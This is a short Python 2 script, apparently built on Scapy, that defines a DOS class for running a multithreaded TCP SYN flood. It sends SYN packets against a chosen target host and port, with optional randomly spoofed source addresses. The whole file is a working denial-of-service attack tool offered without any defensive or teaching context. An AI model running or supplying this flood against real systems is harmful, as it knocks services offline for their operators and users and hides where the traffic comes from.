#! /usr/bin/env python
# -*- coding: utf-8 -*-

import threading
import random
import copy

class DOS():
    target = None
    port = None
    #init
    def __init__(self, target, port = 80):
        self.target = target
        self.port = int(port)

    def tcp_syn_flood(self, start=30000, length=30000, fake_ip = True):
        pool = self.createFloodPool(start, length, 100, self.__tcp_syn_flood, fake_ip, arguments = {})

        print "Starting flooding..."
        for t in pool: t.start()      # Starting threads
        for t in pool: t.join()       # Joining threads
        print "Ending flooding."

    def createFloodPool(self, flood_port_start, flood_port_len, flood_port_step, funct, fake_ip, arguments = {}):
        pool = []
        for port in range(flood_port_start, flood_port_start + flood_port_len, flood_port_step):
            arg = copy.copy(arguments)
            arg['start'] = port
            arg['end'] = port + flood_port_step
            if fake_ip: arg['fake_ip'] ="10." + '.'.join([str(i) for i in random.sample(xrange(255), 3)])

            t = threading.Thread(target=funct, name="flood-" + str(port), kwargs=arg)
            pool.append(t)

        return pool

    def __tcp_syn_flood(self, fake_ip = None, start=40000, end=50000):
        if fake_ip: ip = IP(dst=self.target, src=fake_ip)
        else: ip = IP(dst=self.target)

        syn = ip / TCP(dport=self.port, sport=(start, end), flags='S')
        send(syn, verbose=0)
